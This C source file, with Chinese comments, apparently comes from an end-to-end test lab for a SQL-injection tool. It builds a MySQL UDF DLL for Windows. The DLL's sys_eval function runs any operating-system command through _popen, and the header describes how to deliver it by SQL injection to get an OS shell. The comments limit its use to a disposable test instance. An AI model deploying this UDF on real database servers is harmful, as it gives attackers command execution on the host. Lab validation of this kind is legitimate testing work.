/*
 * e2e/udf-lab/udf_sys.c —— 最小可用 MySQL UDF（Windows x64）
 * ============================================================================
 * 用途：把「UDF 接管链路」从 mock 单测变成可真实验证的闭环：
 *   编译 DLL → 经 SQL 注入投递到 plugin_dir → CREATE FUNCTION ... SONAME
 *   → SELECT 调用 → 拿到真实返回值。
 *
 * 只实现两个函数，刻意保持最小：
 *   udf_echo(str)        原样返回入参 —— 证明 DLL 被加载且能回传数据
 *   sys_eval(cmd)         执行系统命令并返回 stdout —— os-shell 的核心原语
 *
 * 安全边界（仅用于受控靶场）：
 *   - 只在 e2e/udf-lab 起的临时实例（独立 datadir、独立端口）上使用；
 *   - 验证时只执行无害命令（whoami / echo）；
 *   - 验证结束即 DROP FUNCTION + 停实例 + 删除全部产物。
 *
 * 编译（x64）：
 *   vcvars64.bat && cl /nologo /LD /I <mysql>/include udf_sys.c /link /OUT:udf_sys.dll
 * ============================================================================
 */
#pragma warning(disable : 4819) /* 源码含中文注释，GBK 码页下的无害告警 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <mysql.h>

/*
 * MySQL 8.0 移除了 my_bool（改用 bool），但 UDF 的标准 init 签名仍是它。
 * 这里按需补齐，使同一份源码在 5.7 / 8.0 头文件下都能编译。
 */
#ifndef MYSQL_UDF_MY_BOOL_DEFINED
typedef char my_bool;
#endif

/* MSVC 下必须显式导出，否则 CREATE FUNCTION ... SONAME 找不到符号入口 */
#define UDF_EXPORT __declspec(dllexport)

/* ---------- udf_echo：原样返回入参 ---------- */

UDF_EXPORT my_bool udf_echo_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
  if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT)
  {
    strcpy(message, "udf_echo() requires exactly one string argument");
    return 1;
  }
  return 0;
}

UDF_EXPORT char *udf_echo(UDF_INIT *initid, UDF_ARGS *args, char *result,
               unsigned long *length, char *is_null, char *error)
{
  if (args->args[0] == NULL)
  {
    *is_null = 1;
    return NULL;
  }
  *length = args->lengths[0];
  return args->args[0];
}

UDF_EXPORT void udf_echo_deinit(UDF_INIT *initid) {}

/* ---------- sys_eval：执行命令并返回 stdout（对齐 lib_mysqludf_sys 约定）----------
 * 命名必须与 lib_mysqludf_sys 一致，否则项目的 osShell 路径1（直接调 sys_eval）
 * 与路径3（udfInstall 后重试）都不会命中——这是链路能否自动打通的关键。
 */

UDF_EXPORT my_bool sys_eval_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
  if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT)
  {
    strcpy(message, "sys_eval() requires exactly one string argument");
    return 1;
  }
  return 0;
}

UDF_EXPORT char *sys_eval(UDF_INIT *initid, UDF_ARGS *args, char *result,
              unsigned long *length, char *is_null, char *error)
{
  char *cmd = args->args[0];
  if (cmd == NULL)
  {
    *is_null = 1;
    return NULL;
  }
  FILE *fp = _popen(cmd, "r");
  if (fp == NULL)
  {
    strcpy(result, "popen failed");
    *length = 12;
    return result;
  }
  /* 读回 stdout（受 result 缓冲限制，约 255 字节，足够验证链路） */
  size_t n = fread(result, 1, 255, fp);
  _pclose(fp);
  *length = (unsigned long)n;
  return result;
}

UDF_EXPORT void sys_eval_deinit(UDF_INIT *initid) {}
